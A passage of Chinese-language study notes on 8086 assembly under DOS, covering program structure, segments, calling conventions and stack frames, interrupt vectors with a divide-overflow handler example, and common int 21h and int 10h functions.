\uff1a\u5141\u8bb8\u4e2d\u65ad\uff0c\u5373 if = 1 OF DF IF TF SF ZF AF PF CF nop \u6307\u4ee4\u683c\u5f0f \uff1anop \u6307\u4ee4\u4f5c\u7528 \uff1a\u65e0\u64cd\u4f5c\uff0c\u673a\u5668\u7801 90h\uff0c\u5360\u7528\u4e00\u4e2a\u5b57\u8282\u7a7a\u95f4\uff0c\u4e14\u6d88\u8017\u8fd0\u884c\u65f6\u95f4\uff0c\u4f46\u4e0d\u8fdb\u884c\u64cd\u4f5c hlt \u6307\u4ee4\u683c\u5f0f \uff1ahlt \u6307\u4ee4\u4f5c\u7528 \uff1a\u505c\u6b62\u5904\u7406\u5668\u5de5\u4f5c\uff0c\u76f4\u5230\u7cfb\u7edf\u590d\u4f4d\u6216\u53d1\u9001\u975e\u5c4f\u853d\u4e2d\u65ad\u6216\u5916\u90e8\u4e2d\u65ad 8086 \u6c47\u7f16\u7a0b\u5e8f\u7f16\u5199 \u00b6 \u6c47\u7f16\u7a0b\u5e8f\u57fa\u672c\u7ed3\u6784 \u00b6 data segment ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 hey db ' Hello , world ! ' , 0 Dh , 0 Ah , ' $ ' ; \u4f2a\u6307\u4ee4\u8bed\u53e5 data ends ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 code segment ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 assume cs : code , ds : data ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 main: ; \u6307\u4ee4\u8bed\u53e5 mov ax , data ; ... mov ds , ax mov ah , 9 mov dx , offset hey int 21 h mov ah , 4 Ch int 21 h code ends ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 end main ; \u6c47\u7f16\u6307\u793a\u8bed\u53e5 \u6bb5\u7684\u5b9a\u4e49\u3001\u5047\u8bbe\u4e0e\u5f15\u7528 \u00b6 \u6bb5\u5b9a\u4e49 \u00b6 < segmentname > segment [ < align > ] [ < combine > ] [ '< class >' ] < statements > < segmentname > ends \u65b9\u62ec\u53f7\u4e2d\u53ef\u4ee5\u7701\u7565 align\uff1a\u5bf9\u9f50\u65b9\u5f0f\uff0cbyte word dword para page\uff08para \u4e3a 16 \u5b57\u8282\uff0cpage \u4e3a 256 \u5b57\u8282\uff09\u7f3a\u7701\u4e3a para combine\uff1a\u5408\u5e76\u7c7b\u578b\uff0cpublic stack common memory at\uff0cpublic \u4e00\u822c\u7528\u4e8e\u4ee3\u7801\u6bb5\u6570\u636e\u6bb5\uff0cstack \u7528\u4e8e\u5806\u6808\u6bb5 ss \u81ea\u52a8\u521d\u59cb\u5316\u4e3a\u5806\u6808\u6bb5\u7684\u6bb5\u5730\u5740\uff0csp \u81ea\u52a8\u521d\u59cb\u5316\u4e3a\u5806\u6808\u6bb5\u672b\u5c3e\u5b57\u8282\u504f\u79fb\u5730\u5740\u52a0 1 \u4ee3\u7801\u6bb5\u6570\u636e\u6bb5\u53ef\u4ee5\u7701\u7565 public\uff0c\u5806\u6808\u6bb5\u4e0d\u80fd\u7701\u7565 stack 'class'\uff1a\u7c7b\u522b\u540d \u6570\u636e\u6bb5\u5b9a\u4e49\u65f6\u521d\u59cb\u6570\u636e\u4f2a\u6307\u4ee4\u4e3a \u53d8\u91cf\u540d\uff08\u6807\u53f7\u540d\uff09\u3001\u5927\u5c0f\u3001\u5185\u5bb9 \uff0c\u5927\u5c0f\u5373\u4e3a db dw dd \u7b49\u3002\u5982\u679c\u91cd\u590d\u53ef\u4ee5\u7528 \u5927\u5c0f \u5185\u5bb9 dup(\u6b21\u6570) \u7684\u5f62\u5f0f \u5806\u6808\u6bb5\u5b9a\u4e49\u4e00\u822c\u4f7f\u7528\uff1a stk segment stack db 100 h dup ( 0 ) stk ends \u5373\u5f00\u542f\u4e00\u4e2a 100h \u5927\u5c0f\u7684\u5806\u6808 \u6bb5\u7684\u5047\u8bbe \u00b6 assume \u7528\u6765\u5efa\u7acb\u6bb5\u5bc4\u5b58\u5668\u4e0e\u6bb5\u7684\u5173\u7cfb\uff0c\u5e2e\u52a9\u6c47\u7f16\u7f16\u8bd1\u7a0b\u5e8f\u8865\u5145\u6bb5\u5730\u5740 \u4e00\u822c\u5199\u4e3a assume cs : code ds : data ss : stk \u7684\u5f62\u5f0f\uff0c\u8fd9\u6837\u89e3\u6790\u53d8\u91cf\u65f6\u5c31\u53ef\u4ee5\u81ea\u52a8\u586b\u5145\u6bb5\u5730\u5740\uff0c\u6bd4\u5982\u4f7f\u7528 mov ah , [ abc ] \u6765\u5f15\u7528 data \u6bb5\u4e2d\u53d8\u91cf abc\uff0cabc \u7684\u6bb5\u5730\u5740\u4e3a data\uff0c\u800c\u901a\u8fc7 assume \u77e5\u9053 data \u5c31\u662f ds\uff0c\u56e0\u6b64\u4f1a\u88ab\u89e3\u91ca\u4e3a mov ah , ds :[...] \u867d\u7136 cs \u548c ss \u4f1a\u81ea\u52a8\u8d4b\u503c\u4e3a\u6bb5\u5730\u5740\uff0c\u4f46 ds \u548c es \u4e0d\u4f1a\uff0c\u9700\u8981\u5728\u4ee3\u7801\u6bb5\u91cc\u624b\u52a8\u4fee\u6539 \u6bb5\u7684\u5f15\u7528 \u00b6 \u76f4\u63a5\u5199\u6bb5\u540d\u5c31\u662f\u6bb5\u5730\u5740\u3002\u4f7f\u7528 seg \u53d8\u91cf\u540d \u6216 seg \u6807\u53f7\u540d \u5373\u8868\u793a\u53d8\u91cf/\u6807\u53f7\u6240\u5728\u7684\u6bb5\u5730\u5740 \u7a0b\u5e8f\u7684\u7ed3\u675f \u00b6 \u6e90\u7a0b\u5e8f\u7684\u7ed3\u675f \u00b6 \u4f7f\u7528 end \u6307\u4ee4\u7ed3\u675f\uff0c\u683c\u5f0f\u4e3a end \u6807\u53f7\u540d \uff0c\u6307\u5b9a\u7a0b\u5e8f\u4ece\u6807\u53f7\u5904\u5f00\u59cb\u8fd0\u884c \u7a0b\u5e8f\u6bb5\u524d\u7f00 \u00b6 \u7a0b\u5e8f\u6bb5\u524d\u7f00\uff08Program Segment Prefix\uff0cPSP\uff09\u662f\u4e00\u6bb5\u957f\u5ea6\u4e3a 100h \u5b57\u8282\u7684\u5185\u5b58\u3002DOS \u5728\u8fd0\u884c\u7a0b\u5e8f\u65f6\uff0c\u5148\u4e3a\u7a0b\u5e8f\u5206\u914d\u4e00\u4e2a PSP\uff0c\u7136\u540e DOS \u8bfb\u53d6\u6539\u7a0b\u5e8f\u5185\u5bb9\u88c5\u5165 PSP \u540e\u9762\u7684\u5185\u5b58\u4e2d\uff0c\u6700\u540e\u628a ds \u548c es \u8bbe\u7f6e\u4e3a PSP \u6bb5\u5730\u5740\uff0c\u628a ss \u548c sp \u8bbe\u7f6e\u4e3a\u5806\u6808\u6bb5\u6bb5\u5730\u5740\u548c\u5806\u6808\u6bb5\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u504f\u79fb\u5730\u5740\u52a0 1\uff0c\u518d\u628a cs \u8bbe\u7f6e\u4e3a\u4ee3\u7801\u6bb5\u6bb5\u5730\u5740\uff0cip \u8bbe\u7f6e\u4e3a\u6e90\u7a0b\u5e8f\u4e2d end \u6307\u5b9a\u6807\u53f7\u7684\u504f\u79fb\u5730\u5740\uff0c\u7136\u540e\u7a0b\u5e8f\u4ece cs:ip \u5f00\u59cb\u8fd0\u884c PSP \u91cc\u9762\u5b58\u653e\u4e86\u4e0e\u7a0b\u5e8f\u8fd0\u884c\u6709\u5173\u7684\u91cd\u8981\u4fe1\u606f\uff0c\u6bd4\u5982\u547d\u4ee4\u884c\u53c2\u6570\u3001\u73af\u5883\u5757\u6bb5\u5730\u5740\u3001\u7236\u7a0b\u5e8f\u7684 PSP \u6bb5\u5730\u5740\u7b49 \u7a0b\u5e8f\u7684\u7ec8\u6b62 \u00b6 \u901a\u5e38\u8c03\u7528 21h \u53f7\u4e2d\u65ad\u7684 4C \u53f7\u529f\u80fd\u7ec8\u6b62\uff0c\u5982\uff1a mov ah , 4 Ch mov al , \u8fd4\u56de\u7801 int 21 h \u6c47\u7f16\u7a0b\u5e8f\u8bed\u53e5 \u00b6 \u7a7a\u767d\u4e0d\u654f\u611f \u5e38\u6570\u53ef\u4ee5\u4f7f\u7528\u6574\u578b\u5e38\u6570\u3001\u5b57\u7b26\u5e38\u6570\u3001\u5b57\u7b26\u4e32\u5e38\u6570\uff08\u62c6\u4e3a\u5b57\u7b26\uff09 \u53ef\u4ee5\u4f7f\u7528\u5e38\u6570\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u5e38\u6570\uff0c\u6709 + - * / mod shl shr not and or xor seg offset\uff0c\u5e38\u6570\u8868\u8fbe\u5f0f\u4e2d\u4e0d\u80fd\u51fa\u73b0\u5bc4\u5b58\u5668\u7b49\uff0c\u53ea\u80fd\u662f\u5e38\u6570 \u53ef\u4ee5\u4f7f\u7528 eql \u548c = \u5b9a\u4e49\u7b26\u53f7\u5e38\u6570 = \u7684\u53f3\u4fa7\u53ea\u80fd\u662f\u6570\u503c\u7c7b\u578b\u6216\u5b57\u7b26\u7c7b\u578b\u7684\u5e38\u6570\u6216\u5e38\u6570\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u5bf9\u540c\u4e00\u7b26\u53f7\u91cd\u65b0\u5b9a\u4e49 eql \u7684\u53f3\u4fa7\u8fd8\u53ef\u4ee5\u662f\u5b57\u7b26\u4e32\u3001\u6c47\u7f16\u8bed\u53e5\uff08 dosint eql < int 21 h > \uff09\uff0c\u4f46\u4e0d\u80fd\u5bf9\u540c\u4e00\u7b26\u53f7\u91cd\u65b0\u5b9a\u4e49 \u53d8\u91cf\u540d\u548c\u6807\u53f7\u540d\u7684\u547d\u540d\uff1a\u53ef\u4ee5\u662f 52 \u4e2a\u5927\u5c0f\u5199\u5b57\u6bcd\u300110 \u4e2a\u6570\u5b57\u3001\u4ee5\u53ca @$?_\uff0c\u6570\u5b57\u4e0d\u80fd\u5f00\u5934\uff0c$ \u4e0e ? \u4e0d\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u4e00\u822c\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff08\u7f16\u8bd1\u65f6\u52a0\u4e0a /ml \u533a\u5206\u5927\u5c0f\u5199\uff09 \u6807\u53f7\u5b9a\u4e49 \u6807\u53f7\u540d: \u5373\u53ef \u6216\u8005 \u6807\u53f7\u540d label near | far | byte | word | dword near far \u6807\u8bc6\u8fd1\u6807\u53f7\u548c\u8fdc\u6807\u53f7 byte word dword \u6807\u8bc6\u6807\u53f7\u4e3a\u53d8\u91cf \u53d8\u91cf\u7684\u5f15\u7528\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u53d8\u91cf\u540d\u6216\u8005 [\u53d8\u91cf\u540d] \u53ef\u4ee5\u4f7f\u7528 \u53d8\u91cf\u540d[\u504f\u79fb] \u6765\u7c7b\u4f3c\u6570\u7ec4\u5f15\u7528\u503c\uff0c\u4f46\u504f\u79fb\u8bb0\u5f97\u504f\u79fb 1 \u5c31\u662f\u52a0\u4e00\u4e2a\u5b57\u8282\uff0c\u800c\u4e0d\u662f\u4e0b\u4e00\u4e2a\u5143\u7d20 \u5b50\u7a0b\u5e8f\u8bbe\u8ba1 \u00b6 \u5b50\u7a0b\u5e8f\u53c8\u79f0\u8fc7\u7a0b\uff0c\u5373\u7c7b\u4f3c\u9ad8\u7ea7\u8bed\u8a00\u4e2d\u7684\u51fd\u6570\uff0c\u901a\u8fc7 call \u8c03\u7528 ret \u8fd4\u56de\uff0c\u53ef\u4ee5\u8fd1\u8c03\u7528\u6216\u8fdc\u8c03\u7528\u3002\u8fc7\u7a0b\u7684\u5b9a\u4e49\uff1a < name > proc < attribute > ... < name > endp \u5176\u4e2d attribute \u4e3a near \u6216 far\uff0cnear \u5b9a\u4e49\u8fd1\u8fc7\u7a0b\u4f9b\u8fd1\u8c03\u7528\uff0c\u53ea\u80fd\u5728\u540c\u4e00\u4ee3\u7801\u6bb5\u5185\u8d77\u4f5c\u7528\uff1bfar \u5b9a\u4e49\u8fdc\u8fc7\u7a0b\u4f9b\u8fdc\u8c03\u7528\uff0c\u53ef\u4ee5\u5728\u540c\u4e00\u4ee3\u7801\u6bb5\u6216\u4e0d\u540c\u4ee3\u7801\u6bb5\u5185\u4f7f\u7528 \u5982\u679c\u8fbe\u5230\u51fd\u6570\u7684\u6548\u679c\u4e5f\u53ef\u4ee5\u4e0d\u5b9a\u4e49\u8fc7\u7a0b\uff0c\u53ea\u5b9a\u4e49\u4e00\u4e2a\u6807\u53f7\uff0c\u7136\u540e\u4f7f\u7528 ret / retn \u8fd4\u56de \u8fc7\u7a0b\u4e2d\u8981\u4fdd\u62a4\u67d0\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u6b64\u65f6\u8981\u5728\u8fc7\u7a0b\u5f00\u5934 push \u5165\u5806\u6808\uff0c\u7ed3\u5c3e\u4ece\u5806\u6808 pop \u56de\u6765 \u5806\u6808\u4f20\u9012\u53c2\u6570 \u00b6 \u4f7f\u7528\u5806\u6808\u4f20\u9012\u53c2\u6570\u6709\u4e09\u79cd\u6807\u51c6\u65b9\u5f0f __cdecl \u65b9\u5f0f \u00b6 c \u8bed\u8a00\u7684\u6807\u51c6\u65b9\u5f0f\uff0c\u53c2\u6570\u4ece\u53f3\u5230\u5de6\u538b\u5165\u5806\u6808\uff0c\u5e76\u4e14\u7531\u8c03\u7528\u8005\u6e05\u7406\u5806\u6808\u3002 f: push bp mov bp , sp ... mov sp , bp pop bp ret main: ... push a2 ; \u538b\u5165\u53c2\u6570 push a1 call f add sp , 4 ; \u6e05\u7406\u5806\u6808 __pascal \u65b9\u5f0f \u00b6 pascal \u8bed\u8a00\u7684\u6807\u51c6\u65b9\u5f0f\uff0c\u53c2\u6570\u4ece\u5de6\u5230\u53f3\u538b\u5165\u5806\u6808\uff0c\u7531\u88ab\u8c03\u7528\u8005\u6e05\u7406\u5806\u6808\u3002 f: push bp mov bp , sp ... mov sp , bp pop bp ret 4 main: ... push a1 push a2 call f __stdcall \u65b9\u6cd5 \u00b6 Windows API \u7684\u6807\u51c6\u65b9\u6cd5\uff0c\u53c2\u6570\u4ece\u53f3\u5230\u5de6\u538b\u5165\u5806\u6808\uff0c\u7531\u88ab\u8c03\u7528\u8005\u6e05\u7406\u5806\u6808 \u52a8\u6001\u53d8\u91cf\u4e0e\u5806\u6808\u7ed3\u6784 \u00b6 \u6bd4\u5982 c \u8bed\u8a00\u7684\u89c4\u8303\uff0c\u5728\u51fd\u6570\u4e2d\u4f1a\u6709\u52a8\u6001\u5c40\u90e8\u53d8\u91cf\uff0c\u8fd9\u4e9b\u53d8\u91cf\u4f1a\u5b58\u653e\u5728\u5806\u6808\u4e0a\u3002\u51fd\u6570\u5f00\u5934\u5148 push bp \u5b58\u4e0b\u524d\u5e27\u6307\u9488\uff0c\u7136\u540e mov bp, sp \u5c06 bp \u79fb\u52a8\u5230\u6808\u9876\u3002\u4e4b\u540e\u53ef\u4ee5 sub sp, ... \u6765\u5411\u4e0a\u79fb\u52a8 sp \u6307\u9488\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e3a\u51fd\u6570\u7559\u51fa\u5806\u6808\u4e0a\u7684\u4e00\u90e8\u5206\u7a7a\u95f4\uff0c\u8fd9\u4e9b\u7a7a\u95f4\u88ab\u7528\u6765\u5b58\u653e\u5c40\u90e8\u53d8\u91cf\u3002\u6267\u884c\u8fc7 sub sp, ... \u540e\u7684\u5806\u6808\u7ed3\u6784\u5982\uff1a +-------------+ | | <- sp +-------------+ \\ | | | +-------------+ | | | | +-------------+ |- \u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4 | | | +-------------+ | | | | +-------------+ / | bp | <- bp +-------------+ | return addr | <- \u7531 call \u538b\u5165 +-------------+ | arg0 | <- [bp+4] +-------------+ | arg1 | <- [bp+6] +-------------+ | ... | +-------------+ \u5982\u56fe\u5373\u4e3a\u901a\u8fc7 sub sp, 10 \u5f00\u8f9f\u4e86 10 \u4e2a\u5b57\u8282\u7684\u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4\uff0c\u6b64\u65f6\u518d\u8fdb\u884c push \u548c pop \u64cd\u4f5c\u65f6\u5219\u4f1a\u5411\u4e0a\u589e\u957f\u4e0d\u4f1a\u8986\u76d6\u8be5\u51fd\u6570\u7684\u7a7a\u95f4\u3002 \u53c2\u6570\u548c\u5c40\u90e8\u53d8\u91cf\u4e5f\u90fd\u901a\u8fc7 bp \u6765\u8bbf\u95ee\uff0c\u6bd4\u5982\u53c2\u6570\u4ece [bp+4] \u5f00\u59cb\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u7136\u540e [bp+6] \u662f\u7b2c\u4e8c\u4e2a\uff0c\u2026\u2026\u3002\u5c40\u90e8\u53d8\u91cf\u90fd\u662f\u901a\u8fc7 [bp-...] \u6765\u8fdb\u884c\u8bbf\u95ee\u7684 \u8fd9\u6837\u7684\u5e27\u6808\u7ed3\u6784\u5728\u51fd\u6570\u9000\u51fa\u65f6\u5148 mov sp, bp\uff0c\u6b64\u65f6 sp \u56de\u843d\u56de bp \u7684\u4f4d\u7f6e\uff0c\u5c40\u90e8\u53d8\u91cf\u5168\u90e8\u5931\u6548\uff0c\u7136\u540e pop bp \u53d6\u51fa\u524d\u5e27\u6307\u9488\uff0c\u518d ret\uff0c\u6b64\u65f6 pop \u51fa\u8fd4\u56de\u5730\u5740\u8fd4\u56de\uff0c\u7136\u540e\u5728\u8c03\u7528\u8005\u5904\u60c5\u51b5\u5806\u6808\u4e2d\u7684\u53c2\u6570 C \u8bed\u8a00\u7684\u51fd\u6570\u91cc bp \u4e0d\u8981\u88ab\u66f4\u6539\uff0c\u540c\u6837\u4e5f\u9700\u8981\u4fdd\u62a4 bx si di \u7684\u503c\uff0c\u4f7f\u5176\u5728\u8c03\u7528\u51fd\u6570\u524d\u540e\u4e0d\u53d8\uff0c\u4e14\u51fd\u6570\u7684\u8fd4\u56de\u503c\u7531 ax \u63d0\u4f9b\uff0c\u6240\u4ee5\u4e00\u822c\u7684\u51fd\u6570\u5199\u6cd5\u5c31\u662f\uff1a f: push bp mov bp , sp sub sp , ... push bx push si push di ... ; [bp+?] \u4e3a\u53c2\u6570 ... ; [bp-?] \u4e3a\u5c40\u90e8\u53d8\u91cf mov ax , ... ; \u8bbe\u7f6e\u8fd4\u56de\u503c pop di pop si pop bx mov sp , bp pop bp ret \u8fd9\u79cd\u5199\u6cd5\u4e0b\u5e27\u6808\u7ed3\u6784\u548c\u5bc4\u5b58\u5668\u90fd\u4e0d\u4f1a\u4e71\u6389\uff0c\u5373\u4f7f\u662f\u8fdb\u884c\u9012\u5f52\u4e5f\u6ca1\u6709\u95ee\u9898 \u4e2d\u65ad \u00b6 \u4e2d\u65ad\u662f\u5728 CPU \u8fd0\u884c\u671f\u95f4\u9047\u5230\u67d0\u4e9b\u60c5\u51b5\u6682\u65f6\u4e2d\u6b62\u5f53\u524d\u7a0b\u5e8f\uff0c\u53bb\u6267\u884c\u53e6\u4e00\u6bb5\u7279\u6b8a\u5904\u7406\u7a0b\u5e8f\u7684\u8fc7\u7a0b\u3002\u5206\u4e3a\u5185\u90e8\u4e2d\u65ad\u548c\u5916\u90e8\u4e2d\u65ad\uff0c\u5185\u90e8\u4e2d\u65ad\u4e00\u822c\u5c31\u662f\u7531 int \u6307\u4ee4\u6216\u8005 CPU \u7684\u67d0\u4e9b\u9519\u8bef\u6216\u8005\u8c03\u8bd5\u670d\u52a1\u5f15\u8d77\u7684\uff0c\u5916\u90e8\u4e2d\u65ad\u4e00\u822c\u5c31\u662f\u65f6\u949f\u4e2d\u65ad\u3001\u952e\u76d8\u4e2d\u65ad\u7b49 \u4e2d\u65ad\u8c03\u7528\u4e0e\u8fd4\u56de\u5728\u524d\u9762\u6307\u4ee4\u90e8\u5206\u6709\u4ecb\u7ecd \u4e2d\u65ad\u5411\u91cf \u00b6 \u4e2d\u65ad\u5411\u91cf\u5373\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u5165\u53e3\u7684\u5730\u5740\uff0c\u4e3a 4 \u4e2a\u5b57\u8282\uff0c\u524d\u4e24\u4e2a\u5b57\u8282\u4e3a\u504f\u79fb\u5730\u5740\uff0c\u540e\u4e24\u4e2a\u5b57\u8282\u4e3a\u6bb5\u5730\u5740 \u7cfb\u7edf\u4e2d\u4e00\u5171\u6709 256 \u4e2a\u4e2d\u65ad\u53f7\uff0c\u8303\u56f4\u5728 00h \u5230 0FFh\uff0c\u6bb5\u5730\u5740 0000h \u5904\u4e3a\u4e2d\u65ad\u5411\u91cf\u8868\uff0c\u4e2d\u65ad\u5411\u91cf\u7684\u5730\u5740\u4f4d\u4e8e 0000:[4*\u4e2d\u65ad\u53f7]\uff0c\u4f8b\u5982 word ptr 0:[20h] \u5b58\u653e 8h \u65f6\u949f\u4e2d\u65ad\u7684\u504f\u79fb\u5730\u5740\uff0cword ptr 0:[22h] \u5b58\u653e\u65f6\u949f\u4e2d\u65ad\u7684\u6bb5\u5730\u5740 \u66f4\u6539\u4e2d\u65ad\u5411\u91cf \u00b6 \u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u4ee4 es \u4e3a 0\uff0c\u901a\u8fc7 es:[...] \u7684\u65b9\u5f0f\u6765\u66f4\u6539\u4e2d\u65ad\u5411\u91cf\uff0c\u4f46\u7a0b\u5e8f\u7ed3\u675f\u540e\u5e76\u4e0d\u4f1a\u6539\u56de\u6765\uff0c\u800c\u4ea7\u751f\u9519\u8bef\u3002\u56e0\u6b64\u8981\u5728\u6539\u4e4b\u524d\u5b58\u4e0b\u539f\u6765\u7684\u4e2d\u65ad\u5411\u91cf\uff0c\u7a0b\u5e8f\u7ed3\u675f\u524d\u518d\u6539\u56de\u539f\u6765\u7684\u4e2d\u65ad\u5411\u91cf \u4f8b code segment assume cs : code old_00h dw 0 , 0 int_00h: mov ch , 10 h iret main: push cs pop ds xor ax , ax mov es , ax mov bx , 0 mov ax , es :[ bx ] mov dx , es :[ bx + 2 ] mov old_00h [ 0 ], ax mov old_00h [ 2 ], dx mov word ptr es :[ bx ], offset int_00h mov es :[ bx + 2 ], cs mov ax , 123 h mov ch , 1 div ch mov ax , old_00h [ 0 ] mov dx , old_00h [ 2 ] mov es :[ bx ], ax mov es :[ bx + 2 ], dx mov ah , 4 Ch int 21 h code ends end main \u9664\u6cd5\u6ea2\u51fa \u00b6 \u9664\u6cd5\u6ea2\u51fa\u6709\u4e24\u79cd\u60c5\u51b5\uff1a \u9664\u4ee5 0 \u4f1a\u6ea2\u51fa \u5546\u65e0\u6cd5\u4fdd\u5b58\u5230 al \u6216 ax \u4e2d\uff0c\u4f1a\u53d1\u751f\u6ea2\u51fa \u6ea2\u51fa\u7684\u65f6\u5019\u4f1a\u5728 div \u6307\u4ee4\u7684\u524d\u9762\u63d2\u5165\u4e00\u6761 int 00 h \u5e76\u8fd0\u884c\uff0cDOS \u6267\u884c 0 \u53f7\u4e2d\u65ad\u4f1a\u8f93\u51fa\u6ea2\u51fa\u4fe1\u606f\u5e76\u7ec8\u6b62\u7a0b\u5e8f \u56e0\u6b64\u4e5f\u5c31\u53ef\u4ee5\u4fee\u6539 0 \u53f7\u4e2d\u65ad\u7684\u4e2d\u65ad\u5411\u91cf\uff0c\u4f7f\u4e4b\u7ee7\u7eed\u8fd0\u884c\uff0c0 \u53f7\u4e2d\u65ad\u9000\u51fa\u540e\u4ecd\u4f1a\u91cd\u65b0\u8fd0\u884c\u521a\u521a\u51fa\u73b0\u95ee\u9898\u7684 div \u6307\u4ee4\uff0c\u4e00\u4e2a\u4f8b\u5b50\u89c1\u4e0a\uff08\u5373\u4fee\u6539\u4e2d\u65ad\u5411\u91cf\u7684\u90a3\u4e2a\u4f8b\u5b50\uff09 \u65f6\u949f\u5ef6\u8fdf \u00b6 DOS \u4e2d\u65ad \u00b6 DOS \u4e2d\u65ad\u5373\u662f int 21h\uff0c\u5b83\u4f5c\u4e3a\u4e00\u4e2a\u51fd\u6570\u96c6\u5305\u542b\u4e86\u6807\u51c6\u8f93\u5165/\u8f93\u51fa\u3001\u6587\u4ef6\u7ba1\u7406\u3001\u5185\u5b58\u7ba1\u7406\u3001\u8fdb\u7a0b\u7ba1\u7406\u7684\u4e2d\u65ad\u8c03\u7528\uff0c\u63d0\u4f9b\u4e86\u8bf8\u591a\u5b50\u529f\u80fd\uff08ah \u4e3a\u529f\u80fd\u53f7\uff09\uff0c\u5b8c\u6574\u89c1 Ralf Brown's Interrupt List \uff0c\u4e0b\u9762\u662f\u4e00\u4e9b\u5e38\u7528\u529f\u80fd AH=01h \u529f\u80fd \uff1a\u8f93\u5165\u5b57\u7b26\u529f\u80fd \u4f5c\u7528 \uff1a\u4ece\u952e\u76d8\u8bfb\u5165\u5355\u4e2a\u5b57\u7b26\uff0c\u5982\u679c\u662f Ctrl-Break \u5219\u9000\u51fa\uff0c\u5426\u5219\u5c06\u952e\u503c\u9001\u5165 al \u4e2d AH=02h \u529f\u80fd \uff1a\u8f93\u51fa\u5b57\u7b26\u529f\u80fd \u4f5c\u7528 \uff1a\u5c06 dl \u4ee5\u5b57\u7b26\u7684\u5f62\u5f0f\uff08ASCII\uff09\u6253\u5370\u51fa\u6765 AH=09h \u529f\u80fd \uff1a\u8f93\u51fa\u5b57\u7b26\u4e32\u529f\u80fd \u4f5c\u7528 \uff1a\u5c06 ds:dx \u5904\u5b57\u7b26\u4e32\u8f93\u51fa\uff0c\u8be5\u5b57\u7b26\u4e32\u5fc5\u987b\u4ee5 '$' \u7ed3\u5c3e AH=0Ah \u529f\u80fd \uff1a\u8f93\u5165\u5b57\u7b26\u4e32\u529f\u80fd \u4f5c\u7528 \uff1ads:dx \u4e3a\u4e00\u4e2a buf\uff0cbuf \u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e3a\u5141\u8bb8\u8f93\u5165\u7684\u6700\u591a\u5b57\u7b26\u6570\uff0c\u4e2d\u65ad\u540e\u7b2c\u4e8c\u4e2a\u5b57\u8282\u53d8\u4e3a\u5b9e\u9645\u8f93\u5165\u7684\u5b57\u7b26\u6570\uff0c\u7b2c\u4e09\u4e2a\u5b57\u8282\u5f00\u59cb\u662f\u8f93\u5165\u7684\u5b57\u7b26\u5185\u5bb9\u3002\u5982\u679c\u8f93\u5165\u8d85\u8fc7\u6700\u5927\u5b57\u7b26\u6570\uff0c\u5219\u4f1a\u53d1\u51fa\u94c3\u58f0\uff0c\u5e76\u4e14\u5149\u6807\u4e0d\u518d\u79fb\u52a8 AH=4Ch \u529f\u80fd \uff1a\u7ec8\u6b62\u7a0b\u5e8f\u529f\u80fd \u4f5c\u7528 \uff1a\u9000\u51fa\u5f53\u524d\u7a0b\u5e8f\uff0c\u8fd4\u56de\u7801\u4e3a al\uff08DOS \u4e2d\u4e0d\u4f1a\u5904\u7406\uff0c\u53ef\u4ee5\u4e0d\u5199\uff09 BIOS \u4e2d\u65ad \u00b6 int 10h \u7c7b\u578b \uff1a\u89c6\u9891\u4e2d\u65ad \u5b50\u529f\u80fd \uff1aah = 00h \u53f7\u529f\u80fd\u5207\u6362\u663e\u793a\u6a21\u5f0f al = 03h \u8868\u793a 80*25 \u6587\u672c\u6a21\u5f0f al = 13h \u8868\u793a 320*200*256 \u56fe\u5f62\u6a21\u5f0f \u6587\u672c\u6a21\u5f0f\u7f16\u7a0b \u00b6 \u7a0b\u5e8f\u8fd0\u884c\u65f6\u9ed8\u8ba4\u7ec8\u7aef\u5c31\u5904\u4e8e\u6587\u672c\u6a21\u5f0f\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u5199\u5165\u76f8\u5e94\u5185\u5b58\u5730\u5740\u6765\u66f4\u6539\u663e\u793a\u6587\u672c\u7684\u5185\u5bb9 \u6574\u4e2a\u6587\u672c\u6a21\u5f0f\u7684\u5c4f\u5e55\u5de6\u4e0a\u89d2\u5750\u6807\u4e3a (0, 0)\uff0c\u53f3\u4e0b\u89d2\u5750\u6807\u4e3a (79, 24)\u3002\u5185\u5b58\u7ed3\u6784\u4e3a\u4e00\u4e2a\u5b57\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff08\u9ad8 8 \u4f4d\u4e3a\u663e\u793a\u7684\u5b57\u7b26\uff0c\u4f4e 8 \u4f4d\u4e2d\u9ad8 4 \u4f4d\u4e3a\u80cc\u666f\u8272\uff0c\u4f4e 4 \u4f4d\u4e3a\u524d\u666f\u8272\uff09\uff0c(x, y) \u4f4d\u7f6e\u5904\u7684\u5b57\u7b26\u5bf9\u5e94\u5185\u5b58\u4f4d\u4e8e word ptr B800:[(y*80+x)*2] \u5904 \u7f16\u7a0b\u65f6\u5148\u8bbe\u7f6e es \u4e3a 0B800h\uff0c\u7136\u540e\u8ba1\u7b97\u51fa bx = (y*80+x)*2\uff0c\u7136\u540e\u4ee4 byte ptr es:[bx] = \u5b57\u7b26\uff0cbyte ptr es:[bx+1] = \u989c\u8272 \u56fe\u5f62\u6a21\u5f0f\u7f16\u7a0b \u00b6 \u628a\u663e\u5361\u5207\u6362\u5230\u56fe\u5f62\u6a21\u5f0f\u4f7f\u7528 int 10h \u4e2d\u65ad\uff0c mov ax , 0013 h \u8bbe\u7f6e\u5b50\u529f\u80fd\u53f7\u4e3a 0\uff0c\u6a21\u5f0f\u7f16\u53f7 al \u4e3a 13h \u5373\u56fe\u5f62\u6a21\u5f0f\uff0c\u7136\u540e int 10 h \u5373\u53ef\u5207\u6362\u5230\u56fe\u5f62\u6a21\u5f0f\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u662f 320*200 